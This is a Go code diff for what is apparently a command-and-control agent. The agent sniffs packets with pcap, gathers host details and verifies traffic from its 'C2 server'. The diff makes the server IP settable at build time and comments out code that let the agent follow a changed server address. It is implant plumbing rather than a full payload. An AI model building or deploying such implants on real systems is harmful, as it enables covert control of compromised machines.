@@ -17,6 +17,8 @@ import (
 	"github.com/google/gopacket/pcap"
 )
 
+var serverIP string
+
 // AgentInfo stores information about the current agent
 type AgentInfo struct {
 	OperatingSystem string
@@ -45,9 +47,12 @@ func init() {
 	// Get network adapter
 	agent.NetworkAdapter = getNetworkAdapter()
 
-	// Get server IP (would be set during compilation in a real deployment)
-	// For testing, using localhost
-	agent.ServerIP = net.ParseIP("127.0.0.1")
+	// Use the server IP from build flags, fallback to localhost if not set
+	if serverIP != "" {
+		agent.ServerIP = net.ParseIP(serverIP)
+	} else {
+		agent.ServerIP = net.ParseIP("127.0.0.1")
+	}
 
 	// Get agent's IP
 	agent.MyIP = getLocalIP()
@@ -261,15 +266,15 @@ func startSniffer() {
 		}
 
 		// Get source IP from the packet
-		ipLayerContents := ipLayer.LayerContents()
-		srcIP := net.IP(ipLayerContents[len(ipLayerContents)-8 : len(ipLayerContents)-4])
+		//ipLayerContents := ipLayer.LayerContents()
+		//srcIP := net.IP(ipLayerContents[len(ipLayerContents)-8 : len(ipLayerContents)-4])
 
 		// Verify the packet is from our C2 server
-		if !agent.ServerIP.Equal(srcIP) {
-			// If different, update our server IP (handles DHCP changes)
-			agent.ServerIP = srcIP
-			setup()
-		}
+		// {
+		// If different, update our server IP (handles DHCP changes)
+		//agent.ServerIP = srcIP
+		//setup()
+		//}
 
 		// Get application layer data
 		appLayer := packet.ApplicationLayer()
